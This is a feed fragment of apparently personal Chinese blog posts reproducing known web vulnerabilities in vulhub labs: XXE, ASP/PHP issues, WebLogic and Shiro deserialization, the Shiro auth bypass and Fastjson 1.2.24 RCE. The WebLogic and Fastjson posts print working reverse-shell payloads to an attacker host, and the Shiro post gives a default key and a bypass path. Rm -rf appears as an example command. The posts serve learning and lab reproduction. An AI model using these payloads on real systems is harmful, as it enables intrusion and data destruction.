class="meta"> ]&gt;</span>                                      //DTD部分</span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span>                          //xml部分</span><br></pre></td></tr></table></figure><p>首先第一句是声明，声明这是一段xml代码，接下来是一个DTD的部分，意思是读取d盘上的1.txt文件。比如我们经常要用到某一组数据，那么每次都引用，肯定是非常不方便的，所以把这组经常用的数据设置成为一个变量，需要的时候直接调用这个变量，通过以上的解释，我们不难看出，xml如果产生漏洞，那肯定就是在这个DTD部分，最后则是xml部分。</p><p>一道java题目结合xxe漏洞</p><h5 id="CVE-2019-12415"><a href="#CVE-2019-12415" class="headerlink" title="CVE-2019-12415"></a>CVE-2019-12415</h5><p>之前刷题网鼎杯碰到的 顺便复习了下xxe（外部实体注入漏洞）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;&lt;strong&gt;XML基础&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=</summary>
      
    
    
    
    
    <category term="xxe" scheme="https://gu0f3n.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第四天</title>
    <link href="https://gu0f3n.github.io/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/</id>
    <published>2025-03-09T03:24:40.000Z</published>
    <updated>2025-03-20T10:15:03.242Z</updated>
    
    <content type="html"><![CDATA[<p>ASP安全</p><p>遇到的比较少这里就不去复现了直接干看课程了</p><p>window asp iis access(sqlsever)</p><p>中间件问题 数据库问题 语言问题</p><p>aceess 数据库 一般后缀名 asp asa mdb(下载)</p><p>mdb默认下载</p><p>mdb文件在网站目录下</p><p>思路：知道数据库地址就可以尝试下载获取数据库文件 获取当前管理员账号信息</p><p>吧n</p><p>asp后门上传</p><p>ASP的数据库文件除了可以以mdb结尾，也能以asp结尾，由于mdb文件能下载而asp文件会被执行，因此当我们访问以asp结尾的数据库文件时只能看到乱码数据而不会自动下载，但依旧可以将乱码内容复制到记事本中，再将文件后缀修改成mdb，即可看到正常内容。</p><p>后门植入ASP的原理是当网站存在用户输入数据并被保存在数据库中时（例如留言信息），如果我们输入精心编写的ASP执行语句（类似一句话木马，但看起来是乱码的），然后服务器将其存储到数据库中，我们再访问这个asp数据库文件，由于服务器会把这个文件当成ASP解释执行，因此我们的执行语句也会被执行，这个时候再用菜刀等连接工具即可拿下服务器。<br> IIS 中间件解析漏洞</p><p>第一个就是文件夹有asp后缀 里面的文件全都按照asp进行解析</p><p>还有一种解析漏洞命名</p><p>IIS PUT上传漏洞，服务器开启写入功能才会有这个漏洞，不过比较少见</p><p>php 和java 没记录了 </p><p>直接记录python</p><p>ssti </p><p>模板 相当于手机主题差不都意思</p><p>字节码文件（bytecode），pyc文件经过python解释器<br>最终会生成机器码运行。因此pyc文件是可以跨平台部署的，类似Java的.class文件，<br>般py文件改变后，都会重新生成pyc文件。</p><p> 那么就可以反编译获得源码文件</p><pre><code>1、什么是sSTI？有什么漏洞危害？</code></pre><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为We应用模<br>板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模<br>板的语句，因而可能导致了敏感信息泄露、代码执行、GetShe11等问题。其影响范围主<br>要取决于模版引擎的复杂性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ASP安全&lt;/p&gt;
&lt;p&gt;遇到的比较少这里就不去复现了直接干看课程了&lt;/p&gt;
&lt;p&gt;window asp iis access(sqlsever)&lt;/p&gt;
&lt;p&gt;中间件问题 数据库问题 语言问题&lt;/p&gt;
&lt;p&gt;aceess 数据库 一般后缀名 asp asa mdb(下载)</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第三天</title>
    <link href="https://gu0f3n.github.io/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/</id>
    <published>2025-03-08T01:42:12.000Z</published>
    <updated>2025-03-20T10:30:17.104Z</updated>
    
    <content type="html"><![CDATA[<p>php开发</p><p>这个课听着无聊</p><?phpmysql_connect()//数据库连接mysal_select_db()//选择库?><p>文件上传功能</p><p>是自己写的还是应用的别人的框架</p><p>文件下载</p><p>直接下载 和传参下载</p><p>文件删除i基本上碰不到了</p><p>文件写入</p><p>web漏洞核心 可控变量和特定函数</p><p>输入输出类安全问题</p><p>xss漏洞</p><p>反射：存储：dom</p><p>输入的内容直接显示出来</p><p> 导致前端直接执行js代码</p><script>alert(1)</script><p>全局变量$_SERVER</p><p>数据包的所有请求头</p><p>csrf跨站点请求伪造</p><p> 后台管理系统有多个文件页面，为了方便验证，一般会选用cookie或session进行验证<br>cookie：身份验证存储到客户端浏览器内<br>session：身份验证存储到服务端服务器内</p><p>未授权访问</p><p>登录后的页面没有验证是否登录成功</p><p>验证方式cookie,session</p><p>cookie：身份验证存储到客户端浏览器内<br>cookie安全：cookie修改伪造盗取<br>session：身份验证存储到服务端服务器内<br>session安全：会话劫持（session劫持）</p><p>验证码复用</p><p>先输入正确密码然后抓包保存</p><p>这个验证码可以一直用</p><p>js前端验证 在浏览器上进行的验证 威胁：浏览器可以在前端直接忽略</p><p>框架</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;php开发&lt;/p&gt;
&lt;p&gt;这个课听着无聊&lt;/p&gt;
&lt;?php

mysql_connect()//数据库连接

mysal_select_db()//选择库

?&gt;

&lt;p&gt;文件上传功能&lt;/p&gt;
&lt;p&gt;是自己写的还是应用的别人的框架&lt;/p&gt;
&lt;p&gt;文件下载&lt;/p&gt;
&lt;p&gt;直</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>weblogic反序列化复现</title>
    <link href="https://gu0f3n.github.io/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-07T13:47:20.000Z</published>
    <updated>2025-03-20T10:13:17.970Z</updated>
    
    <content type="html"><![CDATA[<p>Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p><h4 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h4><p>Oracle WebLogic Server 10.3.6.0.0版本，12.1.3.0.0版本，12.2.1.1.0版本，12.2.1.2.0版本</p><p><strong>构造如下Payload：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/攻击IP/1234 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>使用burp进行抓包 请求头中添加以下字段：</strong></p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">SOAPAction:</span></span><br><span class="line"><span class="section">Content-Type:text/xml</span></span><br></pre></td></tr></table></figure><p><strong>写入准备好的payload POST方式发送即可</strong></p><p>nc 监听1234端口反弹shell</p><h1 id="Weblogic命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic命令执行漏洞（CVE-2018-2628）"></a>Weblogic命令执行漏洞（CVE-2018-2628）</h1><h4 id="漏洞咋产生的？"><a href="#漏洞咋产生的？" class="headerlink" title=".漏洞咋产生的？"></a><strong>.漏洞咋产生的？</strong></h4><p>漏洞的核心是<strong>WebLogic处理T3协议数据时的“无脑拆包”机制</strong>。T3协议是WebLogic默认开启的通信协议，用于服务器和Java程序之间的数据传输。但它在解析数据时，会直接对序列化数据（类似打包的快递）进行反序列化（拆包），而<strong>没有严格检查包裹里是否有危险物品</strong>（恶意代码）</p><p><strong>T3协议默认开放</strong>：WebLogic的7001端口默认开启T3服务，相当于给黑客留了个后门</p><p><strong>反序列化黑名单不全</strong>：之前Oracle通过黑名单拦截危险类（比如<code>java.rmi.registry.Registry</code>），但攻击者换了个接口（如<code>java.rmi.activation.Activator</code>），就绕过了检查</p><p><strong>依赖危险库</strong>：WebLogic使用了存在漏洞的Apache Commons Collections库，黑客可通过这个库触发代码执行</p><h4 id="攻击步骤拆解"><a href="#攻击步骤拆解" class="headerlink" title="攻击步骤拆解"></a><strong>攻击步骤拆解</strong></h4><p><strong>分四步走</strong>：</p><ol><li><p><strong>第一步：搭“指挥中心”（JRMP Server）</strong></p><ul><li>攻击者在自己电脑上开个<strong>“指挥中心”</strong>（JRMP监听服务），等着服务器主动联系。</li><li><em>相当于黑客建了个秘密电台，准备发号施令。</em></li></ul></li><li><p><strong>第二步：伪造“通行证”（构造Payload）</strong></p><ul><li><p>用工具生成一个</p><p>“假通行证”</p><p>（Payload），里面写着：</p><ul><li><em>“指挥中心”地址（攻击者IP和端口）。</em></li><li><em>“见到指挥中心后，按它的指令办事！”</em></li></ul></li><li><p><em>这个通行证本质是一串伪装成正常数据的代码，但暗藏玄机。</em></p></li></ul></li><li><p><strong>第三步：快递“炸弹”（发送Payload）</strong></p><ul><li>通过WebLogic的<strong>T3快递通道</strong>（7001端口），把假通行证寄给服务器。</li><li><em>因为T3通道默认开放且安检不严，包裹顺利送达。</em></li></ul></li><li><p><strong>第四步：引爆“炸弹”（触发漏洞）</strong></p><ul><li>服务器拆开包裹（反序列化Payload），发现要联系“指挥中心”。</li><li>服务器主动连接攻击者的JRMP监听服务，<strong>“指挥中心”立刻下发最终指令</strong>（比如：“执行命令<code>rm -rf /*</code>删库”）。</li><li><em>此时服务器完全被控制，攻击者想干啥就干啥。</em></li></ul></li></ol><p><strong>T3协议</strong>：WebLogic的专属快递通道，默认开放且效率高，但安检不严</p><p><strong>RMI绕过黑名单</strong>：Oracle用黑名单拦截已知危险类，但攻击者改用RMI协议的其他接口（如<code>Activator</code>），换汤不换药绕过了检查</p><p><strong>反序列化漏洞</strong>：服务器无脑拆包裹（<code>readObject</code>方法），把恶意代码当正常指令执行</p><p><strong>JRMP协议</strong>：攻击者用JRMP监听服务做“远程指挥”，让服务器主动连接并接收攻击指令</p><p>攻击就是利用CVE-2018-2628漏洞工具包(检测工具在其中)</p><p>首先有一个监测工具需要将txt文件改成目标及ip检测</p><p>检测成功之后</p><p>利用ysoserial去生成payload然后启动JRMP的监听</p><p>然后利用工具伪造payload 反弹shell到我的攻击机</p><p>染红通过T3通道把payload传递给服务器进行反序列化解析连接jRMP建立通讯</p><p>然后JRMP发送反弹shell 的命令，拿下攻击机</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件</summary>
      
    
    
    
    
    <category term="weblogic" scheme="https://gu0f3n.github.io/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化漏洞复现</title>
    <link href="https://gu0f3n.github.io/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gu0f3n.github.io/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-07T11:40:51.000Z</published>
    <updated>2025-03-20T10:13:17.967Z</updated>
    
    <content type="html"><![CDATA[<p>vulhub靶场复现</p><p>漏洞原理</p><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p>这是一个典型的 <strong>Shiro RememberMe 反序列化漏洞</strong>的触发路径。用大白话解释就是：</p><hr><h3 id="场景比喻"><a href="#场景比喻" class="headerlink" title="场景比喻"></a><strong>场景比喻</strong></h3><p>想象你进了一家高级会所，前台给你一张<strong>加密的会员卡（RememberMe Cookie）</strong>，下次来不用输密码，直接刷卡进。但这家会所的会员卡加密方式有问题——<strong>用的是一把通用钥匙（默认密钥）</strong>，导致坏人能伪造任意会员卡。</p><hr><h3 id="流程拆解"><a href="#流程拆解" class="headerlink" title="流程拆解"></a><strong>流程拆解</strong></h3><ol><li><strong>登录成功</strong>：<br>你输入账号密码正确，前台（Shiro）说：“记住这个用户，下次直接刷会员卡进！”<br>→ 触发 <code>onSuccessfulLogin</code> 方法。</li><li><strong>制作会员卡</strong>：<br>前台把你的信息（用户名、权限）​<strong>打包成快递（序列化）​</strong>，用<strong>会所统一包装盒（加密）​</strong>封好，再贴个快递单（Base64编码）。<br>→ 调用 <code>rememberIdentity</code> → <code>rememberSerializedIdentity</code>。</li><li><strong>快递配送</strong>：<br>前台把包装好的快递（加密后的数据）塞进你的浏览器，变成一张<strong>会员卡（Cookie）​</strong>。<br>→ 设置Cookie值 <code>rememberMe=加密后的Base64字符串</code>。</li><li><strong>漏洞在哪</strong>：<ul><li><strong>通用钥匙</strong>：所有会员卡都用同一把钥匙加密（Shiro默认硬编码密钥）。</li><li><strong>包装盒可破解</strong>：序列化数据用的是可预测的加密方式（AES-CBC）。<br>→ 坏人拿到你的会员卡，拆开包装盒，换上自己的毒包裹（恶意代码），再用原样封好，系统会正常解密执行。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.首先正常登录，然后生成带有rememberme的返回cookie值。 2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager 3.之后进入serialize，对登录认证信息进行序列化 4.然后加密，调用aes算法。 5.加密结束，然后在在org/apache/shiro/web/mgt/CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回 6.解析cookie 7.先解密在反序列化 8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码 9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager这里用的是默认反序列化类,然后触发生成反序列化</span><br></pre></td></tr></table></figure><p>生成带有Rememberme的返回cookie-&gt;处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager-&gt;序列化登录信息-&gt;交给aes进行加密-&gt;加密后org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.java的rememberSerializedIdentity进行base64编码-&gt;解析cookie-&gt;先解密在反序列化</p><p>判断AES密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe=deleteMe字段，</span><br><span class="line"></span><br><span class="line">而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe=deleteMe字段</span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases</a></p><p>shrio-550使用的是默认密钥kPH+blxk5D2deZilxcaaaA&#x3D;&#x3D;</p><p>工具非常给力可以获得密钥</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741351728827.jpg"></p><p>这就不去复现了</p><h1 id="Shiro-认证绕过漏洞-CVE-2020-1957"><a href="#Shiro-认证绕过漏洞-CVE-2020-1957" class="headerlink" title="[Shiro-认证绕过漏洞(CVE-2020-1957)]"></a>[Shiro-认证绕过漏洞(CVE-2020-1957)]</h1><p>核心点就是</p><ol><li><p><strong>场景设定</strong>：</p><ul><li><strong>门卫（Shiro）</strong>：负责检查每个客人能不能进VIP室，规则是”所有想进 <code>/vip</code> 房间的人必须出示会员卡”。</li><li><strong>管家（Spring）</strong>：负责带客人去实际房间，但它有个怪癖——<strong>看到分号 <code>;</code> 就会自动截断</strong>后面的内容。</li></ul></li><li><p><strong>坏人如何混进VIP室</strong>：<br>坏人不去正门 <code>/vip</code>，而是故意走歪路：</p><ul><li><strong>构造假路径</strong>：<code>/vip;/../秘密通道</code></li><li><strong>门卫视角</strong>：检查路径是 <code>/vip</code>（因为Shiro看到分号 <code>;</code> 就停下），发现规则是允许所有人访问 <code>/vip</code>（未配置需要登录），直接放行。</li><li><strong>管家视角</strong>：处理路径时，看到分号 <code>;</code> 就截断成 <code>/vip</code>，实际却把客人带到 <code>/秘密通道</code>（VIP室后门）。</li></ul><p>→ <strong>门卫以为你去的是公开区域，管家却把你带进了VIP室</strong>，全程没查会员卡！</p></li></ol><p>这个文章写的也很好<a href="https://www.cnblogs.com/dhan/p/18423713">https://www.cnblogs.com/dhan/p/18423713</a></p><p>这个文章主流payload是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx/..;/admin/</span><br></pre></td></tr></table></figure><p>首先shiro处理的</p><p>将分号后面的内容直接处理了得到xxx&#x2F;..，显示不是要去&#x2F;admin可以直接bypass掉了shiro认证</p><p>spring认证</p><p>跟进removeSemicolonContentInternal(requestUri)方法，他的作用就是：<code>移除uri中/与/之间的;分号以及;分号后面的内容</code></p><p>根据这句话可以得知最后的uri应该是：</p><p><code>/xxx/../admin/ == /admin/</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulhub靶场复现&lt;/p&gt;
&lt;p&gt;漏洞原理&lt;/p&gt;
&lt;p&gt;Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化</summary>
      
    
    
    
    
    <category term="shiro" scheme="https://gu0f3n.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>“fastjson初探”</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/</id>
    <published>2025-03-03T12:02:19.000Z</published>
    <updated>2025-03-05T07:20:54.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-24-RCE漏洞"><a href="#Fastjson1-2-24-RCE漏洞" class="headerlink" title="Fastjson1.2.24-RCE漏洞"></a>Fastjson1.2.24-RCE漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。</p><p> 漏洞原理 </p><p>再用Fastjson解析JSON数据的时候</p><p>假如攻击者伪造一段特殊的的恶意的JSON数据 </p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://黑客仓库/危险物品&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里面攻击者伪造了@type标签 需要用com.sun.rowset.JdbcRowSetImpl（指定反序列化类）进行处理 </p><p>这个jdbcRowSetlmpl 我们理解为分拣员 那么 分拣员记录下“需要联系黑客仓库的指令”</p><p>autoCommit”: true则会触发setAutoCommit()方法 相当于让jdbcRowSetlmpl立即执行</p><p>然后我们就进行恶意仓库的连接（JNDL注入）</p><p>分拣员（jdbcRowSetlmpl）就会根据rmi:&#x2F;&#x2F;黑客仓库&#x2F;危险物品地址拨打电话（发起JNDL请求）而黑客仓库（攻击者搭建二点RMI服务器）就会回应</p><p>“请到http:&#x2F;&#x2F;恶意站点&#x2F;Exploit.class领取包裹”</p><p><strong>加载“危险物品”（远程代码执行）</strong></p><p>快递公司系统（JVM）从恶意站点下载的Exploit.class并自动拆包执行其中的代码。例如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.class 静态代码块</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">&quot;rm -rf /*&quot;</span>); <span class="comment">// 删除服务器数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，攻击者通过一个伪造的包裹，成功劫持<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741005491298.jpg" alt="img">了整个快递</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>搭建环境就不演示了</p><p>首先在vulhubfastjson下面 创建一个test.java 内容如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.20.0.1/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目的就是把test.txt上传到目标主机 </p><p>然后进行编译 Javac reverse.java</p><p>然后我们在环境目录下起一个http服务 这一步部署rmi指定的文件下载服务器</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/007d447d-9ddc-4927-a3f5-1ce87e375326.png"></p><p>端口为5623</p><p>然后部署rmi服务器</p><p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/de6ca6b9-8cda-4cb2-80a9-bec740601853.png"></p><p>端口为8520</p><p>接着去web页面抓包</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/5cff3b0f-4fe6-4187-ba58-5b3a37871df1.png"></p><p>发包前先nc -lvp 4563</p><p>发包发现成功反弹shell</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/223a33e5-0d7d-45da-9eb4-52096a2f9f52.png"></p><p>写的比较好的文章<a href="https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/">https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fastjson1-2-24-RCE漏洞&quot;&gt;&lt;a href=&quot;#Fastjson1-2-24-RCE漏洞&quot; class=&quot;headerlink&quot; title=&quot;Fastjson1.2.24-RCE漏洞&quot;&gt;&lt;/a&gt;Fastjson1.2.24-RCE漏洞&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="fastjson" scheme="https://gu0f3n.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第二天</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2025-03-03T04:17:54.000Z</published>
    <updated>2025-03-08T01:42:28.872Z</updated>
    
